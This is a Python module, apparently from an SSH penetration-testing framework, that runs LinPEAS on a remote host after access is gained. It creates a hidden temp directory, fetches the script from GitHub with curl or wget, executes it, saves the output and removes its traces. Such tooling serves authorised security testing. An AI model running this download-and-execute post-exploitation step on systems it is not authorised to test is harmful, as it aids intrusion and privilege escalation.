"""Module for running LinPEAS on the remote host."""
import os
from typing import Dict, Any
from modules.post_exploitation.base_module import BasePostExploitationModule
from modules.logger import sshmap_logger


class LinPEASModule(BasePostExploitationModule):
    """
    Executes LinPEAS (Linux Privilege Escalation Awesome Script) on the remote host.
    
    LinPEAS is a comprehensive script that searches for possible paths to escalate
    privileges on Linux/Unix systems.
    """
    
    # LinPEAS download URL - can be overridden if needed
    LINPEAS_URL = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
    # Timeout for LinPEAS execution in seconds (5 minutes)
    EXECUTION_TIMEOUT = 300
    
    @property
    def name(self) -> str:
        return "linpeas"
    
    @property
    def description(self) -> str:
        return "Execute LinPEAS script for privilege escalation enumeration"
    
    async def execute(self, ssh_session, output_dir: str) -> Dict[str, Any]:
        """Execute LinPEAS on the remote host."""
        try:
            hostname = ssh_session.get_remote_hostname()
            sshmap_logger.info(f"[{self.name}] Running LinPEAS on {hostname}")
            
            results = {
                "success": True,
                "hostname": hostname,
                "data": {},
                "error": None
            }
            
            # Create temporary directory on remote host
            temp_dir = "/tmp/.sshmap_linpeas"
            linpeas_path = f"{temp_dir}/linpeas.sh"
            
            sshmap_logger.debug(f"[{self.name}] Creating temporary directory on {hostname}")
            await ssh_session.exec_command(f"mkdir -p {temp_dir}")
            
            # Try to download LinPEAS
            sshmap_logger.info(f"[{self.name}] Downloading LinPEAS to {hostname}")
            download_cmd = f"cd {temp_dir} && curl -L -s -o linpeas.sh {self.LINPEAS_URL} 2>&1"
            download_output = await ssh_session.exec_command(download_cmd)
            
            # Check if download was successful
            check_cmd = f"test -f {linpeas_path} && echo 'EXISTS' || echo 'NOT_FOUND'"
            check_output = await ssh_session.exec_command(check_cmd)
            
            if "NOT_FOUND" in check_output:
                # Try wget as fallback
                sshmap_logger.debug(f"[{self.name}] curl failed, trying wget")
                download_cmd = f"cd {temp_dir} && wget -q -O linpeas.sh {self.LINPEAS_URL} 2>&1"
                download_output = await ssh_session.exec_command(download_cmd)
                
                check_output = await ssh_session.exec_command(check_cmd)
                if "NOT_FOUND" in check_output:
                    raise Exception("Failed to download LinPEAS with curl or wget")
            
            # Make LinPEAS executable
            sshmap_logger.debug(f"[{self.name}] Making LinPEAS executable")
            await ssh_session.exec_command(f"chmod +x {linpeas_path}")
            
            # Execute LinPEAS
            sshmap_logger.info(f"[{self.name}] Executing LinPEAS (this may take several minutes)")
            # Check if timeout command is available, then use it
            check_timeout_cmd = "command -v timeout >/dev/null 2>&1 && echo 'HAS_TIMEOUT' || echo 'NO_TIMEOUT'"
            has_timeout = await ssh_session.exec_command(check_timeout_cmd)
            
            # Run with -a flag for all checks (comprehensive)
            if "HAS_TIMEOUT" in has_timeout:
                exec_cmd = f"cd {temp_dir} && timeout {self.EXECUTION_TIMEOUT} ./linpeas.sh -a 2>&1 || echo 'LinPEAS execution completed or timed out'"
            else:
                # Without timeout, just run the script (may take longer)
                sshmap_logger.warning(f"[{self.name}] timeout command not available, running without timeout")
                exec_cmd = f"cd {temp_dir} && ./linpeas.sh -a 2>&1 || echo 'LinPEAS execution completed'"
            
            linpeas_output = await ssh_session.exec_command(exec_cmd)
            
            results["data"]["output"] = linpeas_output
            
            # Save output to file
            output_file = os.path.join(output_dir, f"{hostname}_linpeas.txt")
            with open(output_file, "w") as f:
                f.write(f"LinPEAS Output\n")
                f.write(f"Host: {hostname}\n")
                f.write(f"{'='*80}\n\n")
                f.write(linpeas_output)
            
            # Cleanup
            sshmap_logger.debug(f"[{self.name}] Cleaning up temporary files")
            await ssh_session.exec_command(f"rm -rf {temp_dir}")
            
            sshmap_logger.display(f"[{self.name}] LinPEAS output saved to {output_file}")
            
            return results
            
        except Exception as e:
            sshmap_logger.error(f"[{self.name}] Failed to execute LinPEAS: {e}")
            
            # Try to cleanup even on error
            try:
                await ssh_session.exec_command(f"rm -rf /tmp/.sshmap_linpeas")
            except:
                pass
            
            return {
                "success": False,
                "hostname": hostname if 'hostname' in locals() else "unknown",
                "data": None,
                "error": str(e)
            }
